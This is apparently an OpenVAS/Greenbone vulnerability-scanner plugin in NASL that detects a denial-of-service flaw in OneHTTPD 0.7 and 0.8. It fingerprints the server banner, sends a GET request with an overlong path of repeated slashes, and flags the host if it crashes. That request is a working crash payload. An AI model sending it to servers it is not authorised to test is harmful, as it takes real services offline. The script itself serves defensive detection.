if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803798" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-02-10 14:48:46 +0530 (Mon, 10 Feb 2014)" );
	script_name( "OneHTTPD HTTP Server Remote Denial of Service Vulnerability" );
	script_tag( name: "summary", value: "This host is running OneHTTPD HTTP Server and is prone to denial of
  service vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP GET request and check whether it
  is able to crash or not." );
	script_tag( name: "insight", value: "The flaw is due to an error when processing certain long requests and can
  be exploited to cause a denial of service via a specially crafted packet." );
	script_tag( name: "impact", value: "Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial-of-service condition." );
	script_tag( name: "affected", value: "OneHTTPD versions 0.7 and 0.8." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/31522" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/windows/onehttpd-08-crash-poc" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "onehttpd/banner" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8080 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Server: onehttpd/" )){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
req = http_get( item: NASLString( "/", crap( length: 245, data: "/" ) ), port: port );
http_send_recv( port: port, data: req );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

